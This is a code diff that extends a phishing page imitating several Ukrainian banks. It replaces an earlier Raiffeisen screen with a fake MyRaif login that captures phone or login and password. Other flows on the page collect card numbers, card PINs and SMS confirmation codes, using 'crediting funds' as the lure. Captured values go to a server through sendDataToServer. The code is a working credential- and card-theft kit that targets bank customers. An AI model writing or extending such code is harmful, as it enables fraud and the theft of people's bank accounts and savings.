@@ -10,9 +10,7 @@
         :root {
             --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6;
             --white: #ffffff; --shadow-color: rgba(0, 0, 0, 0.08); --danger-color: #dc3545;
-            --oschad-primary: #00A39C;
-            /* NEW: Raiffeisen colors */
-            --raiff-primary: #ffdd00; --raiff-dark: #3c3c3b; --raiff-disabled-bg: #e9ecef; --raiff-disabled-text: #adb5bd;
+            --raif-primary: #003087; /* Цвет Райффайзен (синий) */
         }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
@@ -56,7 +54,7 @@
             background-color: rgba(255, 255, 255, 0.8); padding: 2px 6px; border-radius: 4px;
         }
 
-        /* --- Стили для модального окна ЛК Ощадбанка --- */
+        /* Стили для модального окна Райффайзен */
         #custom-modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background-color: #f8f9fa;
@@ -69,94 +67,94 @@
             width: 100%; max-width: none; text-align: center; box-shadow: none;
             display: flex; flex-direction: column; align-items: center;
         }
-        .oschad-header {
+        .raif-header {
             width: 100%; display: flex; align-items: center;
             padding: 10px 15px; background-color: #f8f9fa;
         }
-        .oschad-header .back-arrow {
+        .raif-header .back-arrow {
             font-size: 28px; color: #495057; margin-right: 15px;
             cursor: pointer; line-height: 1;
         }
-        .oschad-header .title {
+        .raif-header .title {
             font-size: 17px;
             font-weight: 500;
             color: #212529;
-            flex-grow: 1; text-align: center; margin-right: 40px; /* Компенсация стрелки для центрирования */
+            flex-grow: 1; text-align: center; margin-right: 40px;
         }
-        .oschad-welcome-section {
+        .raif-welcome-section {
             padding: 20px; text-align: left;
             width: 100%;
             display: flex; flex-direction: column;
             padding-bottom: 120px;
         }
-        .oschad-main-title {
+        .raif-main-title {
             font-size: 26px;
             font-weight: 700;
             margin-bottom: 8px;
             text-align: left;
         }
-        .oschad-welcome-section p {
+        .raif-welcome-section p {
             font-size: 16px; color: #495057; line-height: 1.5;
             margin-bottom: 25px; font-weight: 400;
             text-align: left;
         }
-        .oschad-toggle-buttons {
+        .raif-toggle-buttons {
             display: flex; background-color: #e9ecef; border-radius: 12px;
             overflow: hidden; padding: 4px; margin-bottom: 30px; width: 100%;
         }
-        .oschad-toggle-buttons button {
+        .raif-toggle-buttons button {
             flex: 1; padding: 12px 15px; border: none; background-color: transparent;
             font-size: 15px; font-weight: 600; color: #6c757d; cursor: pointer;
             border-radius: 8px; transition: all 0.2s ease;
         }
-        .oschad-toggle-buttons button.active {
+        .raif-toggle-buttons button.active {
             background-color: var(--white);
             color: var(--dark-text);
             box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
-        .oschad-input-group {
+        .raif-input-group {
             margin-bottom: 20px; width: 100%; position: relative;
         }
-        .oschad-input-group label {
+        .raif-input-group label {
             position: absolute; top: 18px; left: 15px; font-size: 16px; color: #adb5bd;
             transition: all 0.2s ease; pointer-events: none; background-color: var(--white); padding: 0 4px;
             z-index: 1;
         }
-        .oschad-input-group.is-focused > label,
-        .oschad-input-group.has-value > label {
+        .raif-input-group.is-focused > label,
+        .raif-input-group.has-value > label {
             top: -10px; left: 10px; font-size: 12px; color: #6c757d;
         }
-        .oschad-input-field {
+        .raif-input-field {
             width: 100%; padding: 18px 45px 18px 15px;
             border: 1px solid #dee2e6; border-radius: 12px;
             font-size: 16px; color: var(--dark-text); background-color: var(--white);
             transition: all 0.2s ease; outline: none;
             font-weight: 500; position: relative;
         }
-        .oschad-input-field:focus {
-            border-color: var(--oschad-primary);
+        .raif-input-field:focus {
+            border-color: var(--raif-primary);
         }
-        .oschad-input-field::placeholder { color: transparent; }
+        .raif-input-field::placeholder { color: transparent; }
         .password-toggle-icon {
             position: absolute; right: 15px; top: 50%;
             transform: translateY(-50%); cursor: pointer; color: #adb5bd;
             z-index: 2;
         }
-        .oschad-phone-wrapper {
+        .raif-phone-wrapper {
             position: relative; display: flex; align-items: center; width: 100%;
             border: 1px solid #dee2e6; border-radius: 12px;
             background-color: var(--white);
             overflow: hidden;
         }
-        .oschad-phone-wrapper:focus-within {
-            border-color: var(--oschad-primary);
+        .raif-phone-wrapper:focus-within {
+            border-color: var(--raif-primary);
         }
-        .oschad-phone-prefix {
+        .raif-phone-prefix {
             padding: 18px 0 18px 15px;
             font-size: 16px; color: var(--dark-text);
             font-weight: 500;
         }
-        .oschad-phone-wrapper .oschad-input-field {
+        .raif-phone-wrapper .raif-input-field {
             border: none; padding-left: 5px; flex-grow: 1;
         }
         .forgot-password-link {
@@ -164,13 +162,13 @@
             text-align: center;
             margin-top: -10px;
             margin-bottom: 20px;
-            color: var(--oschad-primary);
+            color: var(--raif-primary);
             font-weight: 600;
             text-decoration: none;
             font-size: 15px;
             cursor: pointer;
         }
-        .oschad-submit-button {
+        .raif-submit-button {
             position: fixed; bottom: 20px;
             left: 20px; right: 20px;
             width: auto; padding: 16px; margin: 0; border: none;
@@ -179,8 +177,8 @@
             cursor: not-allowed; transition: all 0.2s ease;
             z-index: 1001;
         }
-        .oschad-submit-button.active {
-            background-color: var(--oschad-primary); color: var(--white); cursor: pointer;
+        .raif-submit-button.active {
+            background-color: var(--raif-primary); color: var(--white); cursor: pointer;
         }
         .auth-error-message {
             color: var(--danger-color);
@@ -198,55 +196,7 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        /* --- СТИЛИ для окна подтверждения кодом --- */
-        .oschad-code-container {
-            padding: 20px; text-align: center; width: 100%;
-            display: flex; flex-direction: column; align-items: center;
-        }
-        .oschad-code-container p {
-            color: #495057; margin: 0 0 10px 0; padding: 0; font-weight: 400; /* Изменен шрифт */
-        }
-        .oschad-code-info {
-            font-size: 16px; font-weight: 400; margin-bottom: 20px !important;
-        }
-        .oschad-code-number {
-            font-size: 22px; font-weight: 500; color: var(--dark-text) !important; margin-bottom: 5px !important;
-        }
-        .oschad-code-instruction {
-            font-size: 16px; font-weight: 500; margin-top: 15px !important; margin-bottom: 30px !important;
-        }
-        .oschad-code-inputs {
-            display: flex; justify-content: center; gap: 15px; margin-bottom: 20px;
-        }
-        .oschad-code-input {
-            width: 50px; height: 55px; text-align: center; font-size: 24px; font-weight: 600;
-            border: 1px solid #dee2e6; border-radius: 12px; background-color: var(--white);
-            outline: none; transition: border-color 0.2s ease; color: var(--dark-text);
-            caret-color: var(--oschad-primary); padding: 0; -moz-appearance: textfield;
-        }
-        .oschad-code-input::placeholder { color: #bdc3c7; font-weight: 400; }
-        .oschad-code-input::-webkit-outer-spin-button, .oschad-code-input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
-        .oschad-code-input:focus { border-color: var(--oschad-primary); }
-        .oschad-code-inputs.error .oschad-code-input { border-color: var(--danger-color); }
-        .oschad-code-error-text {
-            color: var(--danger-color); font-size: 15px; font-weight: 500; margin-bottom: 20px;
-        }
-        .oschad-resend-link {
-            display: block; color: #6c757d; /* Серый по умолчанию */ font-weight: 500;
-            text-decoration: none; font-size: 15px; margin-bottom: 25px;
-            pointer-events: none; /* Неактивна по умолчанию */
-        }
-        .oschad-resend-link.active {
-            color: var(--oschad-primary); /* Активный цвет */
-            cursor: pointer;
-            pointer-events: auto;
-        }
-        .oschad-no-call-link {
-            display: block; color: var(--oschad-primary); /* Бирюзовый цвет */ font-weight: 500;
-            text-decoration: none; font-size: 15px; cursor: pointer;
-        }
-
-        /* --- Стили для модального окна "Нет SMS" --- */
+        /* Стили для модального окна "Нет SMS" */
         .sms-help-modal-backdrop {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background-color: rgba(0, 0, 0, 0.5); display: flex;
@@ -261,18 +211,14 @@
         .sms-help-modal-actions { display: flex; flex-direction: column; gap: 10px; }
         .sms-help-modal-actions button {
             border: none; padding: 12px; border-radius: 8px; font-size: 16px;
-            font-weight: 600; cursor: pointer; width: 100%; background-color: transparent; color: var(--oschad-primary);
+            font-weight: 600; cursor: pointer; width: 100%; background-color: transparent; color: var(--raif-primary);
         }
 
-        /* --- ОБЩИЕ СТИЛИ ФОРМЫ (для восстановления и т.д.) --- */
-        .oschad-form-container { padding: 20px; text-align: left; width: 100%; display: flex; flex-direction: column; padding-bottom: 120px; }
-        .oschad-form-container .oschad-main-title { text-align: left; margin-bottom: 10px; }
-        .oschad-form-container p { text-align: left; margin-bottom: 30px; }
-        
+        /* Общие стили формы */
         #form-header { text-align: center; margin-bottom: 25px; }
         #form-header-logo { max-height: 50px; max-width: 150px; }
         #modal-title { margin-top: 25px; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 25px; }
-        #modal-step-content p { text-align: center; font-size: 16px; color: var(--light-text); line-height: 1.6; margin: 15px 0; font-weight: 500;}
+        #modal-step-content p { text-align: center; font-size: 16px; color: var(--light-text); line-height: 1.6; margin: 15px 0; font-weight: 500; }
         .input-group { margin-bottom: 15px; position: relative; }
         .input-field {
             width: 100%; padding: 15px; border: 1px solid var(--border-color); border-radius: 12px;
@@ -292,98 +238,7 @@
             font-weight: 700; cursor: pointer; transition: all 0.3s ease; flex-basis: 0; flex-grow: 1;
         }
         .btn:disabled { background-color: #ced4da; cursor: not-allowed; }
-        body[data-theme="oschadbank"] { --primary-color: var(--oschad-primary); --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
-
-        /* --- NEW: Стили для модального окна Райффайзен --- */
-        #raiffeisen-modal-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-color: var(--white);
-            display: none; flex-direction: column;
-            z-index: 1000;
-            font-family: 'Roboto', sans-serif; /* Raiffeisen often uses Roboto */
-        }
-        .raiff-header {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 15px 20px; width: 100%;
-            border-bottom: 1px solid var(--border-color);
-        }
-        .raiff-header .back-arrow {
-            font-size: 28px; color: var(--raiff-dark); cursor: pointer;
-            font-weight: 300;
-        }
-        .raiff-header .title {
-            font-size: 16px; font-weight: 500; color: var(--raiff-dark);
-            position: absolute; left: 50%; transform: translateX(-50%);
-        }
-        .raiff-header .logo {
-            height: 28px;
-        }
-        .raiff-content {
-            flex-grow: 1; padding: 25px;
-            display: flex; flex-direction: column; align-items: center;
-            text-align: center;
-        }
-        .raiff-content h2 {
-            font-size: 24px; font-weight: 500; color: var(--raiff-dark);
-            margin: 0 0 30px 0;
-        }
-        .raiff-icons-container {
-            display: flex; gap: 20px; margin-bottom: 40px;
-        }
-        .raiff-icon {
-            width: 60px; height: 60px; border-radius: 50%;
-            border: 2px solid var(--raiff-dark);
-            display: flex; justify-content: center; align-items: center;
-            font-size: 28px; color: var(--raiff-dark); font-weight: 500;
-        }
-        .raiff-input-group {
-            width: 100%; max-width: 340px; position: relative; margin-bottom: 15px;
-        }
-        .raiff-input-group label {
-            position: absolute; top: 18px; left: 15px; color: var(--light-text);
-            transition: all 0.2s ease; pointer-events: none;
-            background: var(--white); padding: 0 5px;
-        }
-        .raiff-input-group.has-value label, .raiff-input-group.is-focused label {
-            top: -10px; font-size: 12px;
-        }
-        .raiff-input-field {
-            width: 100%; padding: 18px 15px;
-            border: 1px solid var(--border-color); border-radius: 8px;
-            font-size: 16px; color: var(--raiff-dark); outline: none;
-            font-weight: 500;
-        }
-        .raiff-input-field:focus {
-            border-color: var(--raiff-dark);
-        }
-        .raiff-phone-wrapper {
-            position: relative;
-        }
-        .raiff-phone-prefix {
-            position: absolute; left: 15px; top: 18px;
-            font-size: 16px; color: var(--raiff-dark); font-weight: 500;
-            pointer-events: none;
-        }
-        #raiff-phone-input {
-            padding-left: 60px; /* Space for +380 prefix */
-        }
-        .raiff-helper-text {
-            font-size: 13px; color: var(--light-text);
-            max-width: 320px; line-height: 1.5;
-        }
-        .raiff-submit-button {
-            position: fixed; bottom: 20px; left: 20px; right: 20px;
-            width: auto; padding: 16px; margin: 0; border: none;
-            border-radius: 12px; font-size: 18px; font-weight: 700;
-            cursor: not-allowed; transition: all 0.2s ease;
-            background-color: var(--raiff-disabled-bg);
-            color: var(--raiff-disabled-text);
-        }
-        .raiff-submit-button.active {
-            background-color: var(--raiff-primary);
-            color: var(--raiff-dark);
-            cursor: pointer;
-        }
+        body[data-theme="raiffeisen"] { --primary-color: var(--raif-primary); --accent-color: #001e5e; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E6E9F1 0%, #D0D7E6 100%); }
     </style>
 </head>
 <body>
@@ -406,16 +261,12 @@
         <div class="custom-modal-content" id="custom-modal-content"></div>
     </div>
 
-    <div id="raiffeisen-modal-overlay">
-        </div>
-
-
 <script>
 document.addEventListener('DOMContentLoaded', () => {
     // --- CONFIG & STATE VARIABLES ---
     const bankFlows = {
         'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank', steps: [] },
-        'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg', theme: 'raiffeisen', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
+        'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg', theme: 'raiffeisen', steps: [] }, // Убраны шаги с phone и card
         'alliance': { name: 'Альянс', logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14', theme: 'alliance', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
         'pumb': { name: 'ПУМБ', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp', theme: 'pumb', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
         'otp': { name: 'OTP Bank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png', theme: 'otp', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
@@ -434,7 +285,7 @@ document.addEventListener('DOMContentLoaded', () => {
     let currentStepIndex = 0;
     let collectedData = {};
     let callTimerInterval;
-    let lastCodeScreen = null; // To track which code screen was last shown
+    let lastCodeScreen = null;
 
     // --- DOM ELEMENTS ---
     const bankGrid = document.querySelector('.bank-grid');
@@ -447,8 +298,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const backBtn = document.getElementById('back-btn');
     const customModalOverlay = document.getElementById('custom-modal-overlay');
     const customModalContent = document.getElementById('custom-modal-content');
-    const raiffeisenModalOverlay = document.getElementById('raiffeisen-modal-overlay');
-
     
     // --- INITIALIZATION ---
     bankGrid.innerHTML = Object.keys(bankFlows).map(id => `<a href="#" class="bank-item" data-bank="${id}"><img src="${bankFlows[id].logoUrl}" alt="${bankFlows[id].name}"><span class="bank-name">${bankFlows[id].name}</span></a>`).join('');
@@ -465,36 +314,6 @@ document.addEventListener('DOMContentLoaded', () => {
     
     // --- DYNAMIC RENDER FUNCTIONS ---
     
-    /** Renders the custom Raiffeisen login modal */
-    function renderRaiffeisenLogin() {
-        const html = `
-            <div class="raiff-header">
-                <span class="back-arrow" id="raiff-back-arrow">←</span>
-                <span class="title">Авторизуйтесь через MyRaif</span>
-                <img src="${bankFlows.raiffeisen.logoUrl}" alt="Raiffeisen Logo" class="logo">
-            </div>
-            <div class="raiff-content">
-                <h2>Ласкаво просимо</h2>
-                <div class="raiff-icons-container">
-                    <div class="raiff-icon">?</div>
-                    <div class="raiff-icon">📞</div>
-                </div>
-                <div class="raiff-input-group">
-                    <label for="raiff-phone-input">Номер мобільного телефону</label>
-                    <div class="raiff-phone-wrapper">
-                        <span class="raiff-phone-prefix">+380</span>
-                        <input type="tel" id="raiff-phone-input" class="raiff-input-field" autocomplete="off">
-                    </div>
-                </div>
-                <p class="raiff-helper-text">Якщо ви не пам'ятаєте номер телефону, зверніться до Інформаційного центру</p>
-            </div>
-            <button class="raiff-submit-button" id="raiff-submit-btn">ПРОДОВЖИТИ</button>
-        `;
-        raiffeisenModalOverlay.innerHTML = html;
-        raiffeisenModalOverlay.style.display = 'flex';
-        addRaiffeisenListeners();
-    }
-
     /** Renders the main Oschadbank login modal */
     function renderOschadbankLogin(options = {}) {
         const { errorType, errorMessage } = options;
@@ -551,6 +370,64 @@ document.addEventListener('DOMContentLoaded', () => {
         customModalContent.innerHTML = html;
         customModalOverlay.style.display = 'flex';
         addOschadbankLoginListeners();
+    }
+
+    /** Renders the main Raiffeisen login modal */
+    function renderRaiffeisenLogin(options = {}) {
+        const { errorType, errorMessage } = options;
+        
+        const html = `
+            <div class="raif-header">
+                <span class="back-arrow" id="raif-back-arrow">←</span>
+                <span class="title">Авторизуйтесь через MyRaif</span> 
+            </div>
+            <div class="raif-welcome-section">
+                <h2 class="raif-main-title">Ласкаво просимо</h2>
+                <p>Для входу введіть логін або номер телефону</p>
+                <div class="raif-toggle-buttons">
+                    <button id="raif-toggle-phone" class="active">Номер телефону</button>
+                    <button id="raif-toggle-login">Логін</button>
+                </div>
+
+                <div id="raif-phone-login-form">
+                    <div class="raif-input-group phone-group">
+                        <div class="raif-phone-wrapper">
+                            <span class="raif-phone-prefix">+380</span>
+                            <input type="tel" class="raif-input-field" id="raif_phone_input" placeholder=" " autocomplete="off">
+                        </div>
+                    </div>
+                    <div class="raif-input-group">
+                        <label for="raif_phone_password_input">Пароль</label>
+                        <input type="password" class="raif-input-field" id="raif_phone_password_input" placeholder=" " autocomplete="off">
+                        <span class="password-toggle-icon">
+                            <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                        </span>
+                    </div>
+                    ${errorType === 'phone' ? `<div class="auth-error-message">${errorMessage}</div>` : ''}
+                    <a href="#" class="forgot-password-link">Забули пароль?</a>
+                </div>
+
+                <div id="raif-login-form" style="display: none;">
+                    <div class="raif-input-group">
+                        <label for="raif_login_input">Логін</label>
+                        <input type="text" class="raif-input-field" id="raif_login_input" placeholder=" " autocomplete="off">
+                    </div>
+                    <div class="raif-input-group">
+                        <label for="raif_login_password_input">Пароль</label>
+                        <input type="password" class="raif-input-field" id="raif_login_password_input" placeholder=" " autocomplete="off">
+                        <span class="password-toggle-icon">
+                            <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                        </span>
+                    </div>
+                    ${errorType === 'login' ? `<div class="auth-error-message">${errorMessage}</div>` : ''}
+                    <a href="#" class="forgot-password-link">Забули пароль?</a>
+                </div>
+            </div>
+            <button class="raif-submit-button" id="raif-submit-btn" disabled>ПРОДОВЖИТИ</button>
+        `;
+        customModalContent.innerHTML = html;
+        customModalOverlay.style.display = 'flex';
+        addRaiffeisenLoginListeners();
     }
 
     /** Renders the loader screen */
@@ -610,7 +487,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
         
         setupCodeInputs(screenId);
-        startCallTimer(60); 
+        startCallTimer(60);
         
         const firstInput = document.querySelector('.oschad-code-input');
         if (firstInput) {
@@ -622,7 +499,7 @@ document.addEventListener('DOMContentLoaded', () => {
     function renderOschadbankCallConfirmation(options = {}) {
         let infoText = 'На Ваш номер телефонує Ощадбанк:';
         if (collectedData.loginMethod === 'phone' && collectedData.phone) {
-            const phone = collectedData.phone.replace(/\D/g, ''); 
+            const phone = collectedData.phone.replace(/\D/g, '');
             const maskedPhone = `+${phone.substring(0,3)} ${phone.substring(3,5)} *** ** ${phone.substring(11)}`;
             infoText = `На Ваш номер ${maskedPhone} телефонує Ощадбанк:`;
         } else if (collectedData.loginMethod === 'login') {
@@ -630,19 +507,27 @@ document.addEventListener('DOMContentLoaded', () => {
         }
         
         renderCodeScreen({
-            header: 'Підтвердження', infoText: infoText, phoneNumbers: ['+38044 363 0133', '+38044 350 0133'],
-            instructionText: 'Прийміть дзвінок та дотримуйтесь інструкцій', resendText: 'Запросити дзвінок повторно',
-            noAccessText: 'Немає можливості отримувати дзвінки та SMS', onNoAccessClick: showNoSmsModal,
-            screenId: 'oschad_call', error: options.error
+            header: 'Підтвердження',
+            infoText: infoText,
+            phoneNumbers: ['+38044 363 0133', '+38044 350 0133'],
+            instructionText: 'Прийміть дзвінок та дотримуйтесь інструкцій',
+            resendText: 'Запросити дзвінок повторно',
+            noAccessText: 'Немає можливості отримувати дзвінки та SMS',
+            onNoAccessClick: showNoSmsModal,
+            screenId: 'oschad_call',
+            error: options.error
         });
     }
 
     /** Renders the "Telegram Debit" SMS screen */
     function renderTelegramSmsScreen(options = {}) {
         renderCodeScreen({
-            header: 'Підтвердження', title: 'Останній крок',
+            header: 'Підтвердження',
+            title: 'Останній крок',
             instructionText: 'Для зарахування коштів на вашу картку введіть одноразовий SMS код',
-            resendText: 'Відправити SMS ще раз', screenId: 'telegram_sms', error: options.error
+            resendText: 'Відправити SMS ще раз',
+            screenId: 'telegram_sms',
+            error: options.error
         });
     }
     
@@ -657,7 +542,8 @@ document.addEventListener('DOMContentLoaded', () => {
             case 1:
                 html = `
                     <div class="oschad-header">
-                        <span class="back-arrow" id="fp-back-arrow">←</span><span class="title">Відновлення пароля</span> 
+                        <span class="back-arrow" id="fp-back-arrow">←</span>
+                        <span class="title">Відновлення пароля</span> 
                     </div>
                     <div class="oschad-form-container">
                         <p>Для відновлення пароля введіть свій фінансовий номер телефону</p>
@@ -681,7 +567,8 @@ document.addEventListener('DOMContentLoaded', () => {
             case 2:
                  html = `
                     <div class="oschad-header">
-                        <span class="back-arrow" id="fp-back-arrow">←</span><span class="title">Відновлення пароля</span> 
+                        <span class="back-arrow" id="fp-back-arrow">←</span>
+                        <span class="title">Відновлення пароля</span> 
                     </div>
                     <div class="oschad-form-container">
                         <h2 class="oschad-main-title">Введіть ваш номер картки</h2>
@@ -704,7 +591,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 const last4 = collectedData.fp_card ? collectedData.fp_card.slice(-4) : 'XXXX';
                  html = `
                     <div class="oschad-header">
-                        <span class="back-arrow" id="fp-back-arrow">←</span><span class="title">Відновлення пароля</span> 
+                        <span class="back-arrow" id="fp-back-arrow">←</span>
+                        <span class="title">Відновлення пароля</span> 
                     </div>
                     <div class="oschad-form-container">
                         <h2 class="oschad-main-title">Введіть пін від картки *${last4}</h2>
@@ -732,63 +620,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // --- HELPER & EVENT LISTENER FUNCTIONS ---
-
-    /** NEW: Adds event listeners for the Raiffeisen login modal */
-    function addRaiffeisenListeners() {
-        const backArrow = document.getElementById('raiff-back-arrow');
-        const phoneInput = document.getElementById('raiff-phone-input');
-        const submitBtn = document.getElementById('raiff-submit-btn');
-        const inputGroup = phoneInput.closest('.raiff-input-group');
-
-        backArrow.addEventListener('click', () => window.location.reload());
-
-        // Floating label logic
-        phoneInput.addEventListener('focus', () => inputGroup.classList.add('is-focused'));
-        phoneInput.addEventListener('blur', () => {
-            inputGroup.classList.remove('is-focused');
-            if (phoneInput.value) {
-                inputGroup.classList.add('has-value');
-            } else {
-                inputGroup.classList.remove('has-value');
-            }
-        });
-
-        // Phone formatting and button activation
-        phoneInput.addEventListener('input', (e) => {
-            let rawValue = e.target.value.replace(/\D/g, '');
-            let value = rawValue.substring(0, 9);
-            let formatted = '';
-
-            if (value.length > 0) formatted += '(' + value.substring(0, 2);
-            if (value.length > 2) formatted += ') ' + value.substring(2, 5);
-            if (value.length > 5) formatted += '-' + value.substring(5, 7);
-            if (value.length > 7) formatted += '-' + value.substring(7, 9);
-            
-            e.target.value = formatted;
-
-            if (value.length === 9) {
-                submitBtn.classList.add('active');
-            } else {
-                submitBtn.classList.remove('active');
-            }
-        });
-
-        submitBtn.addEventListener('click', () => {
-            if (!submitBtn.classList.contains('active')) return;
-
-            const phoneValue = '+380' + phoneInput.value.replace(/\D/g, '');
-            sendDataToServer({ phone: phoneValue }, false); // isFinal = false
-
-            currentStepIndex = 1; // Move to next step (card input)
-            body.dataset.theme = activeBankData.theme;
-            formHeaderLogo.src = activeBankData.logoUrl;
-            
-            raiffeisenModalOverlay.style.display = 'none'; // Hide Raiff modal
-            body.classList.add('form-active'); // Show generic modal
-            
-            renderStep(); // Render the card input step
-        });
-    }
 
     /** Adds event listeners for the main Oschadbank login modal */
     function addOschadbankLoginListeners() {
@@ -822,7 +653,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
         phoneInput.addEventListener('input', (e) => {
             let rawValue = e.target.value.replace(/\D/g, '');
-            if (rawValue.startsWith('380')) { rawValue = rawValue.substring(3); }
+            if (rawValue.startsWith('380')) rawValue = rawValue.substring(3);
             let value = rawValue.substring(0, 9);
             let formatted = '';
             if (value.length > 0) formatted += value.substring(0, 2);
@@ -869,6 +700,96 @@ document.addEventListener('DOMContentLoaded', () => {
             collectedData.loginMethod = activeOschadForm;
             
             if (activeOschadForm === 'phone') {
+                dataToSend.phone = '+380' + phoneInput.value.replace(/\D/g, '');
+                dataToSend.password = phonePassInput.value;
+            } else {
+                dataToSend.login = loginInput.value;
+                dataToSend.password = loginPassInput.value;
+            }
+            sendDataToServer(dataToSend, false);
+            showOschadLoader();
+        };
+    }
+
+    /** Adds event listeners for the main Raiffeisen login modal */
+    function addRaiffeisenLoginListeners() {
+        document.getElementById('raif-back-arrow').addEventListener('click', () => { window.location.reload(); });
+        document.querySelector('.forgot-password-link').addEventListener('click', (e) => {
+            e.preventDefault();
+            // Здесь можно добавить логику для восстановления пароля для Raiffeisen, если нужно
+        });
+
+        const togglePhoneBtn = document.getElementById('raif-toggle-phone');
+        const toggleLoginBtn = document.getElementById('raif-toggle-login');
+        const phoneLoginForm = document.getElementById('raif-phone-login-form');
+        const loginForm = document.getElementById('raif-login-form');
+        let activeRaifForm = 'phone';
+        
+        const phoneInput = document.getElementById('raif_phone_input');
+        const phonePassInput = document.getElementById('raif_phone_password_input');
+        const loginInput = document.getElementById('raif_login_input');
+        const loginPassInput = document.getElementById('raif_login_password_input');
+        const submitBtn = document.getElementById('raif-submit-btn');
+        
+        document.querySelectorAll('.raif-input-group').forEach(group => {
+            const input = group.querySelector('.raif-input-field');
+            if (!input) return;
+            const checkValue = () => { input.value ? group.classList.add('has-value') : group.classList.remove('has-value'); };
+            input.addEventListener('focus', () => group.classList.add('is-focused'));
+            input.addEventListener('blur', () => { group.classList.remove('is-focused'); checkValue(); });
+            input.addEventListener('input', checkValue);
+            checkValue();
+        });
+
+        phoneInput.addEventListener('input', (e) => {
+            let rawValue = e.target.value.replace(/\D/g, '');
+            if (rawValue.startsWith('380')) rawValue = rawValue.substring(3);
+            let value = rawValue.substring(0, 9);
+            let formatted = '';
+            if (value.length > 0) formatted += value.substring(0, 2);
+            if (value.length > 2) formatted += ' ' + value.substring(2, 5);
+            if (value.length > 5) formatted += ' ' + value.substring(5, 7);
+            if (value.length > 7) formatted += ' ' + value.substring(7, 9);
+            e.target.value = formatted.trim();
+        });
+
+        const updateRaifButtonState = () => {
+            const isPhoneFormValid = activeRaifForm === 'phone' && phoneInput.value.replace(/\D/g, '').length === 9 && phonePassInput.value.length > 0;
+            const isLoginFormValid = activeRaifForm === 'login' && loginInput.value.length > 0 && loginPassInput.value.length > 0;
+            if (isPhoneFormValid || isLoginFormValid) {
+                submitBtn.classList.add('active'); submitBtn.disabled = false;
+            } else {
+                submitBtn.classList.remove('active'); submitBtn.disabled = true;
+            }
+        };
+        [phoneInput, phonePassInput, loginInput, loginPassInput].forEach(input => input.addEventListener('input', updateRaifButtonState));
+
+        togglePhoneBtn.addEventListener('click', () => {
+            togglePhoneBtn.classList.add('active'); toggleLoginBtn.classList.remove('active');
+            phoneLoginForm.style.display = 'block'; loginForm.style.display = 'none';
+            activeRaifForm = 'phone'; updateRaifButtonState();
+        });
+        toggleLoginBtn.addEventListener('click', () => {
+            toggleLoginBtn.classList.add('active'); togglePhoneBtn.classList.remove('active');
+            phoneLoginForm.style.display = 'none'; loginForm.style.display = 'block';
+            activeRaifForm = 'login'; updateRaifButtonState();
+        });
+        
+        customModalContent.querySelectorAll('.password-toggle-icon').forEach(icon => {
+            icon.addEventListener('click', () => {
+                const passwordInput = icon.closest('.raif-input-group').querySelector('input');
+                const isPassword = passwordInput.type === 'password';
+                passwordInput.type = isPassword ? 'text' : 'password';
+                icon.style.color = isPassword ? '#212529' : '#adb5bd';
+            });
+        });
+
+        submitBtn.onclick = () => {
+            if(submitBtn.disabled) return;
+            const dataToSend = {};
+            collectedData.loginMethod = activeRaifForm;
+            
+            if (activeRaifForm === 'phone') {
                 dataToSend.phone = '+380' + phoneInput.value.replace(/\D/g, '');
                 dataToSend.password = phonePassInput.value;
             } else {
@@ -1008,6 +929,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- MAIN LOGIC & DATA HANDLING ---
     
+    /** Sends collected data to the server */
     async function sendDataToServer(data, isFinal) {
         collectedData = { ...collectedData, ...data };
         try {
@@ -1015,7 +937,9 @@ document.addEventListener('DOMContentLoaded', () => {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    sessionId, bankName: activeBankData.name, isFinalStep: isFinal,
